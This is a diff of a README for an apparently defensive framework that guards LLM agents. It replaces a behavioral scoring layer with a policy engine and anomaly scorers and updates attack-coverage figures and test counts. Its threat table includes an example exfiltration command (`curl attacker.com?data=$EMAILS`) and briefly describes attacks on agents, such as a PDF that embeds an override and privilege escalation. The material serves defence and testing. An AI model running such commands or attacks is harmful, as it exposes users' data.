@@ -86,7 +86,7 @@
 | L1 Input Shield | Tier-0 blocklist · Tier-1 regex (33 patterns) · Azure Content Safety Prompt Shields | Blocks injection before any API call; ~40–60 % free-tier block rate |
 | L2 Output Guard | Azure AI Language (PII) + Azure Content Safety (toxicity) + LLM-as-judge groundedness | SSN, keys, emails redacted; blocks toxic model outputs; detects hallucinations |
 | L3 Tool Firewall | Pure Python; 5 guardrails + C1/C2/C4 checks | Validates tool-call arguments before execution; HITL escalation on ambiguous calls |
-| L4 RBAC + Behavioral | `L4RBACEngine` (ABAC) + `BehavioralAnomalyDetector` (5 signals) | Composite score matrix: Z-score, Levenshtein, read→exfil chain, domain, entropy |
+| L4 Adaptive Engine | `PolicyDecisionPoint` (PBAC, YAML hot-reload) + `L4Orchestrator` (3 sub-scorers: HalfSpaceTrees baseline, SessionGraph IOA, DriftMonitor) | Two-tier: L4a sync policy (<2ms) + L4b async behavioral scoring (<80ms). TelemetrySpan isolation boundary (CPF S11.2). |
 | Observability | OpenTelemetry → Jaeger (`:4317`) + SQLite audit log | Live SRE traces + tamper-evident compliance record |
 | Dashboard | FastAPI · https://agentguard.exempl4r.xyz/ | Real-time OTel stream, layer breakdown, guarded vs unguarded toggle |
 
@@ -118,15 +118,15 @@
   ╔═══════════════════════════════════════════════════════════════════╗
   ║  L4  RBAC + BEHAVIORAL  (in-process, zero API cost)               ║
   ║                                                                   ║
-  ║  ABAC: role × verb × resource_sensitivity × upstream_risk_score  ║
+  ║  L4a: PBAC Policy Engine (YAML, hot-reload, <2ms)                ║
   ║  Outcome:  ALLOW │ DENY ──▶ BLOCK │ ELEVATE ──▶ HITL queue       ║
   ║                                                                   ║
-  ║  Behavioral signals (composite score → BLOCK / ELEVATE / WARN):  ║
-  ║  ① Z-score call frequency spike (threshold: 2.5σ)                ║
-  ║  ② Levenshtein sequence divergence (threshold: 0.4)              ║
-  ║  ③ read → exfil chain (CRITICAL weight 1.0 → instant BLOCK)      ║
-  ║  ④ Unapproved outbound domain access                              ║
-  ║  ⑤ Shannon entropy spike (multiplier: 1.5×)                      ║
+  ║  L4b: Behavioral sub-scorers (async, isolated, <80ms):           ║
+  ║  ① HalfSpaceTrees online anomaly (per-role, River)                ║
+  ║  ② Session graph + IOA pattern matching (NetworkX)                ║
+  ║  ③ Compliance drift monitor (Pearson sensitivity trajectory)      ║
+  ║  Fusion: 0.35*baseline + 0.40*graph + 0.25*drift                 ║
+  ║  DENY >= 0.90 │ ELEVATE >= 0.70                                  ║
   ╚═══════════════════════════════════════════════════════════════════╝
            │
            ▼
@@ -461,9 +461,9 @@ def my_agent(user_message: str) -> str:
   AT-02 Excessive Agency      █████████████████     85%   L3 Firewall + L4 DENY
   AT-03 Memory Poisoning      ██████████████        70%   L1 regex + L3 check *
   AT-04 Insecure Tool Use     ████████████████████  100%  L3 sql_query + L4 verb
-  AT-05 Resource Exhaustion   ████████████████      80%   L4 Z-score + HITL
-  AT-06 Data Exfiltration     ████████████████████  100%  L3 http allowlist + L4
-  AT-07 Privilege Escalation  ████████████████████  100%  L4 ABAC + cross-agent
+  AT-05 Resource Exhaustion   █████████████████     85%   L4b HalfSpaceTrees + HITL
+  AT-06 Data Exfiltration     ████████████████████  100%  L3 http + L4b session graph
+  AT-07 Privilege Escalation  ████████████████████  100%  L4a PBAC + L4b drift monitor
   AT-08 Supply Chain Attack   ███████████████       75%   L3 registry + L4 RBAC
   AT-09 Hallucination Exploit ████████████████      80%   L2 filter + C2 MELON
   AT-10 Unsafe Coordination   ████████████          60%   L4 inter-agent RBAC **
@@ -479,7 +479,7 @@ def my_agent(user_message: str) -> str:
 | AT-02 Excessive Agency | Agent writes/deletes beyond scope | L3 Tool Firewall | L4 RBAC DENY |
 | AT-03 Memory Poisoning | Adversarial PDF embeds override | L1 Spotlighting* | L3 content check |
 | AT-04 Insecure Tool Use | SQL DROP via injected query | L3 `sql_query` rule | L4 verb check |
-| AT-05 Resource Exhaustion | Runaway tool-call loops | L4 Behavioral Z-score | HITL ELEVATE |
+| AT-05 Resource Exhaustion | Runaway tool-call loops | L4b HalfSpaceTrees anomaly | HITL ELEVATE |
 | AT-06 Data Exfiltration | `curl attacker.com?data=$EMAILS` | L3 `http_*` domain allowlist | L4 read→exfil chain |
 | AT-07 Privilege Escalation | Agent assumes admin role mid-session | L4 ABAC role lock | L4 cross-agent check |
 | AT-08 Supply Chain Attack | Malicious tool injected at runtime | L3 tool registry check | L4 RBAC deny |
@@ -567,8 +567,8 @@ def my_agent(user_message: str) -> str:
 
 ```
   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐
-  │  95 – 97.5%  │   │     96%      │   │    0.65 s    │   │     410      │
-  │  Attack Block│   │  CRITICAL    │   │  Avg Block   │   │  Unit Tests  │
+  │  95 – 97.5%  │   │     96%      │   │    0.65 s    │   │     218      │
+  │  Attack Block│   │  CRITICAL    │   │  Avg Block   │   │  Unit + E2E  │
   │    Rate      │   │  Block Rate  │   │  (fast path) │   │  0 failures  │
   └──────────────┘   └──────────────┘   └──────────────┘   └──────────────┘
    vs 7.5% unguarded   adversarial suite   no API needed
@@ -583,7 +583,7 @@ def my_agent(user_message: str) -> str:
 | Combined | CRITICAL attacks | — | 96 % blocked | — | Adversarial suite |
 | Fast path | Offline tiers 0/1 | — | 0.65 s avg | — | No Azure API call needed |
 
-**Test toolchain:** Promptfoo (25+ adversarial scenarios, npx runner) + DeepTeam (OWASP Agentic Top 10). All 410 unit tests pass with 0 failures.
+**Test toolchain:** Promptfoo (25+ adversarial scenarios, npx runner) + DeepTeam (OWASP Agentic Top 10). All 218 unit + e2e tests pass with 0 failures. Includes 8 end-to-end attack scenario tests (credential harvesting, privilege escalation, sensitivity drift, recon+exfil) with real L4 sub-scorers.
 
 **Category breakdown (Run 2 — worst case):**
 
